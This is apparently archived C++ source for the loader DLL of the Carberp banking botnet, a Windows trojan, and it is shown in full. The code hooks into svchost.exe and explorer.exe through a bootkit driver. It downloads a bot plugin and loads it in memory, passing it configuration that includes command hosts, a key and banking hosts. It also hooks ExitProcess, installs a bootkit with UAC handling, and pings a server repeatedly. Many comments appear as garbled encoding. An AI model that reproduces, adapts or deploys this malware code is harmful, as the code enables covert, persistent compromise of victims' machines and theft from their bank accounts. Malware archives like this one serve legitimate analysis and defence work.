/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

#include <windows.h>
#include <shlobj.h>

#include "stdafx.h"
#include "BotCore.h"
#include "Splice.h"
#include "DllLoader.h"
#include "Plugins.h"
#include "DriverConnect.h"

#include "DbgRpt.h"
#include "Utils.h"

#include "BkInstall.h"




//----------------------------------------------------------------------------
#include "BotDebug.h"

namespace LDRDEBGTEMPLATES
{
	#include "DbgTemplates.h"
}

#define LDRDBG LDRDEBGTEMPLATES::DBGOutMessage<>

PCHAR MakeMachineID();

bool TryToCatchHostLevelInstanceMutex(const char* MutexPrefix)
{
	CHAR mutex_name[200];

	m_memset(mutex_name, 0, sizeof(mutex_name));

	PCHAR machine_id = MakeMachineID();
	m_lstrcat(mutex_name, "Global\\");
	m_lstrcat(mutex_name, MutexPrefix);
	m_lstrcat(mutex_name, machine_id);

	STR::Free(machine_id);

	LDRDBG("TryToCatchHostLevelInstanceMutex", "Mutex name '%s'.", mutex_name);

	SECURITY_ATTRIBUTES sa;
	SECURITY_DESCRIPTOR sd;

	pInitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
	pSetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);

	sa.nLength = sizeof (SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = &sd;
	sa.bInheritHandle = FALSE;

	HANDLE mutex_handle = (HANDLE)pCreateMutexA(&sa, FALSE, mutex_name);
	if (mutex_handle == NULL) return false;

	// Catch ownership of mutex and never release
	DWORD wait_result = (DWORD)pWaitForSingleObject(mutex_handle, 1000);
	if (wait_result == WAIT_OBJECT_0) return true;

	pCloseHandle(mutex_handle);
	return false;
}


void DbgRptSvchostThread(void* Arguments)
{
	LDRDBG("DbgRptSvchostThread", "Try to catch host level svchost mutex.");
	if (!TryToCatchHostLevelInstanceMutex("svrpt"))
	{
		LDRDBG("DbgRptSvchostThread", "Svchost mutex already catched by another process. Finishing.");
		return;
	}
	
	LDRDBG("DbgRptSvchostThread", "Svchost mutex catched successfully.Sleeping before network started (3 min)...");
	pSleep(3 * 60 * 1000);

	for(;;)
	{
		LDRDBG("DbgRptSvchostThread", "Notify debug report...");

		// 304_ld ���������� ������ � Svchost (������ 3 ������)
		DebugReportStepByName("304_ld");

		DebugReportUpdateNtldrCheckSum();

		LDRDBG("DbgRptSvchostThread", "Sleeping 15 min after report...");
		pSleep(15 * 60 * 1000);
	}
}

void DbgRptExplorerThread(void* Arguments)
{
	LDRDBG("DbgRptExplorerThread", "Try to catch host level explorer mutex.");
	if (!TryToCatchHostLevelInstanceMutex("exrpt"))
	{
		LDRDBG("DbgRptExplorerThread", "Explorer mutex already catched by another process. Finishing.");
		return;
	}
	
	LDRDBG("DbgRptExplorerThread", "Explorer mutex catched successfully.");

	for(;;)
	{
		LDRDBG("DbgRptExplorerThread", "Notify debug report...");

		// 305_ld ���������� ������ � Explorer (������ 3 ������)
		DebugReportStepByName("305_ld");

		LDRDBG("DbgRptExplorerThread", "Sleeping 15 min after report...");
		pSleep(15 * 60 * 1000);
	}
}

void DbgRptRebootNotifyThread(void* Arguments)
{
	while (true)
	{
		LDRDBG("DbgRptRebootNotifyThread", "Pinging server...");

		//150_d ������ ������� ���������� ������
		DebugReportStepByName("150_d");

		LDRDBG("DbgRptRebootNotifyThread", "Sleeping 10 min");
		pSleep(10 * 60 * 1000);
	}
}



//----------------------------------------------------------------------------

PWCHAR SVChostName = L"svchost.exe";
char   BotPluginName[] = "bot.plug";

namespace DLLLoader
{
	typedef VOID (WINAPI *TExitProcess)(UINT Code);

	TExitProcess Real_ExitProcess = NULL;

	HANDLE ThreadHandle = NULL; // ����� ����������� ������

	DWORD ExplorerPID = 0;
	bool DLLLoadedInExplorer = false;


	const static char LoaderSignalFileName[] = {'\\', 'n', 't', 'l', 'd', 'l', '.', 'i', 'n', 'f',  0};

	//------------------------------------------------------------------------
	PCHAR GetSignalFileName()
	{
		// ������� ���������� ��� ����������� �����


		// ���������� ��������� ����
		char WinDir[257];

		if (pGetWindowsDirectoryA(&WinDir[0], 256) == 0)
			return NULL;
		
		PCHAR Tmp = WinDir;
		while (*Tmp != ':') Tmp++;
		Tmp++;
		*Tmp = 0;
			
		// ������ ����� ���
		return STR::New(2, WinDir, (PCHAR)LoaderSignalFileName);
	}

	//------------------------------------------------------------------------

	VOID WINAPI Hook_ExitProcess(UINT Code)
	{
		// ������� ��������� �������, ����
		// ������� ����� �������� �������, �� ���������� ��� ����������
		if (ThreadHandle != NULL)
			pWaitForSingleObject(ThreadHandle, INFINITE);

		Real_ExitProcess(Code);
	}
	//------------------------------------------------------------------------

	void WaitExplorer()
	{
		// ������� ������� ������� ����������

		DWORD ID;
		DWORD I = 0;
		do
		{
			ID = GetProcessIdByHash(0x490A0972 /* explorer.exe */);
			I++;
			if (ID == -1)
				pSleep(1000);
		}
		while (ID == -1 && I < 90);
	}
	//------------------------------------------------------------------------

//	PCHAR GetBotPlugCacheFileName()
//	{
//		// ������� ���������� ��� ����� ���� �������
//		char Name[] = {'b', 'p', 'l', 'g', 'l', 's', 't', 'c', 'c', 'h', '.', 'c', 'a', 'c', 'h', 'e',  0};
//		return BOT::GetWorkPathInSysDrive(NULL, Name);
//	}

	//------------------------------------------------------------------------

	DWORD WINAPI DownloadMethod(LPVOID Data)
	{
		// ������� �������� �������
		PUSER_INIT_NOTIFY InitData = (PUSER_INIT_NOTIFY)Data;
		
		LDRDBG("BRDS", "��������� �������� �� ��������� svchost.exe ");

		DriverRemoveInjectToProcess(InitData, SVChostName);

		for (;;)
		{
				WSADATA wsa;
				ClearStruct(wsa);
				DWORD Code = (DWORD)pWSAStartup(MAKEWORD( 2, 2 ), &wsa);
				
				if (Code == 0) break;

				LDRDBG("BRDS", "pWSAStartup failed.");
				return 0; //pSleep(500);
		}
		
		
		LDRDBG("BRDS", "������ �������� ������� ���� (V 10) ");

		DWORD Size = 0;
		LPVOID Module = NULL;


		//��������� ����������
		LDRDBG("BRDS", "�������������� �������� �������!");

		// 311_ld ������ �������� ����� ����� � ������� � svchost
		DebugReportStepByName("311_ld");


		Module = Plugin::DownloadEx(BotPluginName, NULL, &Size, true, true, NULL);

		LDRDBG("BRDS", "DownloadEx result module=0x%u", Module);

		// 312_ld ��������� �������� ����� ����� � ������� � svchost
		DebugReportStepByName("312_ld");

		if (Module != NULL)
		{
			// ��������� ������ � ���
			LDRDBG("BRDS", "��� ������� �������� ");
			MemFree(Module);

			// �������� ����������� ��� � �������	
			// ��������� ������ ��� ������� � ������� ���������� �����

			// ���������� ��������� �� �������� �������� ���
			LDRDBG("BRDS", "���������� ��������� ");

			// 313_ld �������� �������� ����� ����� � ������� � svchost
			DebugReportStepByName("313_ld");

			WaitExplorer();


			PCHAR Buf = "Ok: ";
			DriverSendDataToGlobalCallBack(InitData, &Buf, 4);
		}

		ThreadHandle = NULL; // ������������� ������ ��� ������ �� ����������

		LDRDBG("BRDS", "DownloadMethod finised.");

		return 0;
	}

	

	//------------------------------------------------------------------------
	BOOL StartLoaderThread(LPVOID SystemArgument)
	{

		//// 303_ld ������ � Svchost (��� ���� ����� �� ����)
		//PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("303_ld"));

		// ��������� ����� �������� ���
		
		//===================================================
		// ���� 1. ��������� ������������� ����������� �����
		// ��� ����� �������� ���� � ������������ �������� �
		// �������� ��� �� �������� ����� ����������� �������
		// ����� ����� ��������� �� �����, ��� ���� ������
		// ������, ��� ������� ����������� �������� ��� �����
		//===================================================
		PCHAR FileName = GetSignalFileName();
		if (FileName == NULL) return false;

		// �������� ������� ���
		HANDLE H = (HANDLE)pCreateFileA(FileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_SYSTEM , 0);
		if (H == INVALID_HANDLE_VALUE)
		{
			// ������ �������� �����, �������, ���
			// � ������ ������ ������ ������� ������ �������
			STR::Free(FileName);
			return false;
		}

		// ��������� �������, ��� ����� ����������� ����������
		// ������� ����
		pMoveFileExA(FileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);


		//===================================================
		// ���� 2: ������������� ���� ������� �����������
		// ���������� �������� �� ���������� ������ ������
		// ������
		//===================================================
		if ( HookApi(1, 0x95902B19 /* ExitProcess */, (DWORD)&Hook_ExitProcess ) )
			__asm mov [Real_ExitProcess], eax


		//===================================================
		//  ���� 3: ��������� �����
		//===================================================
		ThreadHandle = StartThread(DownloadMethod, SystemArgument);
		if (ThreadHandle == NULL)
		{
			pCloseHandle(H);
			return false;
		}
		pSetThreadPriority(ThreadHandle, THREAD_PRIORITY_NORMAL);

		//===================================================
		//  ���� 4: ��������� ����� � svchost ������� �� �������� ������
		//===================================================
		StartThread(DbgRptSvchostThread, NULL);



		return true;
	}

	//------------------------------------------------------------------------
}


//---------------------------------------------------------------------

typedef BOOL (WINAPI *TSetParam)(DWORD ID, PCHAR Value);

TSetParam SetParamMethod;

void SetParam(DWORD ID)
{
	// ������� �������� �������� �������
	DWORD Size = GetBotParameter(ID, NULL, 0);
	if (Size == 0) return;

	PCHAR Buf = STR::Alloc(Size + 1);
	GetBotParameter(ID, Buf, Size);

	SetParamMethod(ID, Buf);

	STR::Free(Buf);
}
//---------------------------------------------------------------------


void ExplorerLoadDLL(PUSER_INIT_NOTIFY InitData, LPBYTE Buf, DWORD Size)
{
	// 320_ld ������� �������� � ������� BotPlug
	DebugReportStepByName("320_ld");


	HMEMORYMODULE Module = MemoryLoadLibrary(Buf);

	if (Module == NULL)
	{
		LDRDBG("BRDS Explorer", "�� ������� ��������� ��� � ������ ");
		return;
	}

	const static char SetParamMethName[] = {'S', 'e', 't', 'B', 'o', 't', 'P', 'a', 'r', 'a', 'm', 'e', 't', 'e', 'r',  0};;
	SetParamMethod = (TSetParam)MemoryGetProcAddress(Module, (PCHAR)SetParamMethName);

	if (SetParamMethod != NULL)
	{
		SetBotParameter(BOT_PARAM_BOTPLUGNAME, BotPluginName);

		// ������������� ��������� ����
		LDRDBG("BRDS Explorer", "������������� ��������� ���� ");
		SetParam(BOT_PARAM_PREFIX);
		SetParam(BOT_PARAM_HOSTS);
		SetParam(BOT_PARAM_KEY);
		SetParam(BOT_PARAM_DELAY);
		SetParam(BOT_PARAM_BOTPLUGNAME);
		SetParam(BOT_PARAM_BANKINGHOSTS);
	}

	typedef void (WINAPI *TStart)(LPVOID, LPVOID, LPVOID);

	TStart Method = (TStart)MemoryGetProcAddress(Module, "Start");

	if (Method != NULL)
	{
		LDRDBG("BRDS Explorer", "��� ������� ������� ");
		DLLLoader::DLLLoadedInExplorer = true;
		Method(NULL, NULL, NULL);

		// 321_ld ������� �������� � ������� BotPlug �������
		DebugReportStepByName("321_ld");
	}
}

//------------------------------------------------------------------------

bool DoStartBotDll(PUSER_INIT_NOTIFY InitData, DWORD DelayBeforeStart)
{
	LDRDBG("BRDS Explorer", "DoStartBotDll() ��������");

	// 310_ld ������� �������� ���� ����� � ���� � Explorer
	DebugReportStepByName("310_ld");

	if (IsNewProcess(DLLLoader::ExplorerPID))
		DLLLoader::DLLLoadedInExplorer = false;


	LDRDBG("BRDS Explorer", "DLLLoader::DLLLoadedInExplorer = %d", DLLLoader::DLLLoadedInExplorer);
	if (DLLLoader::DLLLoadedInExplorer)
		return true;


	LDRDBG("BRDS Explorer", "������ ������ �� ����");
	DWORD Size = 0;
	LPBYTE Module = Plugin::DownloadFromCache(BotPluginName, true, NULL, &Size);

	if (Module != NULL)
	{
		// �������������� ����������
		if (DelayBeforeStart != 0) pSleep(DelayBeforeStart);

		LDRDBG("BRDS Explorer", "��� ��������� � ������������.��������� Bot.plug");
		ExplorerLoadDLL(InitData, Module, Size);

		LDRDBG("BRDS Explorer", "Bot.plug �������.");

		MemFree(Module);
	}

	LDRDBG("BRDS Explorer", "DoStartBotDll() ���������.");

	return DLLLoader::DLLLoadedInExplorer;
}
//------------------------------------------------------------------------

VOID WINAPI StartBotDll(LPVOID Reserved, PBUFFER_DATA Data, LPVOID lParam)
{
	DoStartBotDll(PUSER_INIT_NOTIFY(Data), 0);
}


//------------------------------------------------------------------------

DWORD WINAPI ExplorerStartProc(LPVOID Data)
{
	LDRDBG("BRDS", "�������� ������� ����������  ");

	if (Data == NULL) 
	{
		LDRDBG("BRDS Explorer", "��������� ������ ��� ������ � ���������� ");
		return 0;
	}

	// 302_ld ������ � Explorer (��� ���� ����� �� ����)
	DebugReportStepByName("302_ld");

	// ��������� ����� � svchost ������� �� �������� ������
	StartThread(DbgRptExplorerThread, NULL);

	PUSER_INIT_NOTIFY InitData = (PUSER_INIT_NOTIFY)Data;

	LDRDBG("BRDS Explorer", "������� ���� ������� �������� �������� �� ��������� svchost.exe ");
	while (CheckIsInjectToProcess(InitData, SVChostName)) pSleep(300);


	LDRDBG("BRDS Explorer", "������ ������ ���������� ");

	// ������ ����� �������� ��������� ��� �� �����
	
	if (DoStartBotDll(InitData, 5000))
	{	
		LDRDBG("BRDS Explorer", "��� ������� �������� �� ���� ");
		return 0;
	} 

	// ������������ ������� �������� �����
	LDRDBG("BRDS Explorer", "������������ ����� �������� ����� � �������� Explorer ");
	if (!DriverRegisterGlobalCallback(InitData, (DWORD)pGetCurrentThreadId(), StartBotDll, NULL))
	{
		LDRDBG("BRDS Explorer", "������ ����������� ������ �������� ���� ���������� ");
		return 0;
	}

	// ��������� ����������� ���� ��������

	do
	{
		pSleepEx(10000, TRUE); 
		
	}while(1);

	return 0;
}
//------------------------------------------------------------------------

// If dll loader call any of exported function, it resets this variable to FALSE.
// So this action allows to avoid interference with our driver.
BOOL IsLoadedByOriginalBootkitLoader = TRUE;

bool IsDllLoadedByBootkitLoader()
{
	return (IsLoadedByOriginalBootkitLoader == TRUE);
}

void ResetBootkitLoaderFlag()
{
	IsLoadedByOriginalBootkitLoader = FALSE;
}

VOID WINAPI Start(
	PVOID  NormalContext /*��������� ���������*/,
	PUSER_INIT_NOTIFY  SystemArgument1 /*�������� ������� ����� ��������� ���� ������������ ������� � ���������*/,
	PVOID SystemArgument2/* ������ �� �����������*/
	)
{
	ResetBootkitLoaderFlag();
	
	// �������� ����� �������� ��� 
	if (SystemArgument1 == NULL)
		return;


	// ���������� � ����� �������� ���������
	char Name[MAX_PATH];
	if ((DWORD)pGetModuleFileNameA(NULL, Name, MAX_PATH) == 0) return;

	PCHAR ShortName = File::ExtractFileNameA(Name, false);

	DWORD Hash = STR::GetHash(ShortName, 0, true);

	LDRDBG("BRDS", "LoaderDll loaded ...");

	//// 301_ld ������ ������ (��� ���� ����� �� ����)
	//PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("301_ld"));

	if (Hash == 0x2608DF01 /* svchost.exe */)
	{

		PCHAR CL = (PCHAR)pGetCommandLineA();

		LDRDBG("BRDS", "������� ���������� ������ �������� svchost.exe ");
		LDRDBG("BRDS", "��������� ������ svchost.exe - %s ", CL);

		//if (STR::Pos(CL, "localservice", 0, false) >= 0)
		{
			DLLLoader::StartLoaderThread(SystemArgument1);
		}
	}
	if (Hash == 0x490A0972 /* explorer.exe */)
	{
		// 
		LDRDBG("BRDS", "������� ���������� ������ ���������� ");
		StartThread(ExplorerStartProc, SystemArgument1);
	}
};

void ExplorerLoadAndRunBotPlug(void* Arguments)
{
	LDRDBG("ExplorerLoadAndRunBotPlug", "started.");
	DoStartBotDll(NULL, 0);
}

void StartBootkitDll(void* Arguments)
{
	// If Dll loaded by original Bootkit driver we MUST wait some timeout.
	// This happens because by default bootkit driver call DllMain(_, DLL_PROCESS_ATTACH, _)
	// at all.
	// Waiting helps system to load all libraries in default load order. After loading all modules 
	// we can apply GetApi for our reasons.

	DWORD timeout = 5 * 1000;
	
	LDRDBG("StartBootkitDll", "Sleeping %d ms.", timeout);
	pSleep(timeout);
	LDRDBG("StartBootkitDll", "Waking up after %d ms.", timeout);

	DebugReportInit();

	// ���������� � ����� �������� ���������
	char Name[MAX_PATH];
	if ((DWORD)pGetModuleFileNameA(NULL, Name, MAX_PATH) == 0) return;

	PCHAR ShortName = File::ExtractFileNameA(Name, false);

	DWORD Hash = STR::GetHash(ShortName, 0, true);


	LDRDBG("StartBootkitDll", "LoaderDll loaded in path='%s' pid=%u...", Name, (DWORD)pGetProcessId() );

	LDRDBG("StartBootkitDll", "LoaderDll wake up and check IsLoadedByOriginalBootkit=%d", IsDllLoadedByBootkitLoader());
	if (!IsDllLoadedByBootkitLoader())
	{
		LDRDBG("StartBootkitDll", "LoaderDll is NOT loaded by Bootkit loader. Finished.");
		return;
	}

	LDRDBG("StartBootkitDll", "LoaderDll detects original bootkit loading.");
	
	if (Hash == 0x2608DF01 /* svchost.exe */)
	{
		LDRDBG("StartBootkitDll", "LoaderDll loaded in SVCHOST. ");
		StartThread(DbgRptSvchostThread, NULL);
	}
	
	if (Hash == 0x490A0972 /* explorer.exe */)
	{
		LDRDBG("StartBootkitDll", "LoaderDll loaded in EXPLORER. ");
		StartThread(DbgRptExplorerThread, NULL);
		
		LDRDBG("StartBootkitDll", "Starting loading and run plug.");
		StartThread(ExplorerLoadAndRunBotPlug, NULL);
	}
	
	LDRDBG("StartBootkitDll", "finished.");
}

PCHAR GetBootkitSignalFileName()
{
	PCHAR Path= STR::Alloc(MAX_PATH);
	PCHAR UID=STR::Alloc(120);

	pGetSystemDirectoryA(Path,MAX_PATH);
	GenerateUid(UID);
	Path[3]='\0';
	
	PCHAR Pref= STR::GetRightStr(UID,"0");
	m_lstrcat(Path, Pref);

	STR::Free(Pref);
	STR::Free(UID);
	
	return Path;
}

void WaitForOldRing3BotSelfRemoved()
{
	DWORD TimeoutInSec = 20 * 60;
	
	DWORD PeriodInSec = 60;
	DWORD PeriodCount = TimeoutInSec / PeriodInSec;
	PCHAR PathToSignalFile = GetBootkitSignalFileName();
	
	while (true)
	{
		bool IsExists = File::IsExists(PathToSignalFile);
		
		LDRDBG("WaitForOldRing3BotSelfRemoved", "check file='%s' exists='%d'",
			PathToSignalFile, IsExists);

		if(!IsExists) break;
		
		LDRDBG("WaitForOldRing3BotSelfRemoved", "Sleeping %d sec='%s'",
			PeriodInSec);

		// 318_ld �������� �������� �������� ring3 ���� ����� �������������
		DebugReportStepByName("318_ld");

		pSleep(PeriodInSec * 1000);
		PeriodCount--;

		if (PeriodCount == 0)
		{
			break;
		}
	}

	STR::Free(PathToSignalFile);
}

// ����� ��� ������ � �������.
// ����� �� ������������ ��� ������ �� ��������, �����������, ����������� ������ � ��
// � ������ - ������ ������� � Loader_dll � ��� ��� ������ ������� ����, ���� � ���� 
// ��, ��� ��� �����.
// ���������� ����������� ������� � �������.

BOOL WINAPI LoadPlugToCache(BOOL WaitForBotRemove, DWORD /*ReservedTimeout*/)
{
	// ���������������� � ����� ����� � ���: 
	// - ���������� ���� ���������� �������
	// - �������������� ����� ���������� �-���
	ResetBootkitLoaderFlag();
	DebugReportInit();

	DWORD Size = 0;
	LPVOID Module = NULL;

	//��������� ����������
	LDRDBG("LoadPlugToCache", "������ ������ � ������ ��������.");

	// 315_ld ������ �������� ����� ����� ������� LoadPlugToCache
	DebugReportStepByName("315_ld");

	//��������� ����������
	LDRDBG("LoadPlugToCache", "�������� �������� �������!");

	Module = Plugin::DownloadEx(BotPluginName, NULL, &Size, true, true, NULL);

	LDRDBG("LoadPlugToCache", "DownloadEx result module=0x%u", Module);

	// 316_ld ��������� �������� ����� ����� ������� LoadPlugToCache
	DebugReportStepByName("316_ld");

	if (Module != NULL)
	{
		// ��������� ������ � ���
		LDRDBG("LoadPlugToCache", "Module successfuly loaded.");
		
		// 317_ld �������� �������� ����� ����� ������� LoadPlugToCache
		DebugReportStepByName("317_ld");
		MemFree(Module);

		if (WaitForBotRemove == TRUE) WaitForOldRing3BotSelfRemoved();

		return TRUE;
	}

	return FALSE;
}

BOOL WINAPI BkDropWithPossibleUac(const void* SelfBody, DWORD SelfBodySize)
{
	// ���������������� � ����� ����� � ���: 
	// - ���������� ���� ���������� �������
	// - �������������� ����� ���������� �-���
	ResetBootkitLoaderFlag();
	DebugReportInit();

	// ������������� ������ ����� � ������ ���������� UAC
	bool InstallResult = BkDeployAndInstallWithPossibleUac(SelfBody, SelfBodySize);
	LDRDBG("BkDropWithPossibleUac", "BkDeployAndInstallWithPossibleUac return %d", InstallResult);

	if (InstallResult == false) return FALSE;

	// ���� ���������� ���������� - ��������� �������.
	// ���������� ������� � �� ����, ������ ��� �� ���� ��� ��� ��� ����.
	return LoadPlugToCache(FALSE, 0);
}

BOOL WINAPI BkDrop()
{
	// ���������������� � ����� ����� � ���: 
	// - ���������� ���� ���������� �������
	// - �������������� ����� ���������� �-���
	ResetBootkitLoaderFlag();
	DebugReportInit();

	// ������������� ������ �����
	// ���� ���������� ���������� - ��������� �������.
	bool InstallResult = BkDeployAndInstallDll();
	LDRDBG("BkDrop", "DeployAndInstallBkDll return %d", InstallResult);

	if (InstallResult == false) return FALSE;

	LDRDBG("BkDrop", "Bk installed successfuly. Starting reboot ping thread...");
	StartThread(DbgRptRebootNotifyThread, NULL);

	// ���������� ������� � �� ����, ������ ��� �� ���� ��� ��� ��� ����.
	return LoadPlugToCache(FALSE, 0);
}

void WINAPI LoadAndStartPlugFromRawFile(const WCHAR* path)
{
	// ���������������� � ����� ����� � ���: 
	// - ���������� ���� ���������� �������
	// - �������������� ����� ���������� �-���
	ResetBootkitLoaderFlag();
	DebugReportInit();

	LDRDBG("LoadPlugFromRawFile", "started with '%S' param", path);
	
	DWORD DllBodySize;

	LPBYTE DllBody = File::ReadToBufferW((PWCHAR)path, DllBodySize);
	LDRDBG("LoadPlugFromRawFile", "File::ReadToBufferW() return 0x%X", DllBody);

	if (DllBody == NULL) return;

	LDRDBG("LoadPlugFromRawFile", "Calling ExplorerLoadDLL() for loading plug...");
	ExplorerLoadDLL(NULL, DllBody, DllBodySize);
}

#pragma comment(linker, "/ENTRY:LoaderDllMain" )

DWORD WINAPI LoaderDllMain(HINSTANCE , DWORD reason, LPVOID )
{
	LDRDBG("LoaderDllMain", "called with reason=%d", reason);
	if (reason == DLL_PROCESS_ATTACH)
	{
		StartThread(StartBootkitDll, NULL);
	}

	// � ������� ��������� ����� � ������ ��������� 
	// ������������ ��������. ������� ������ ���������� TRUE
	return TRUE;
}
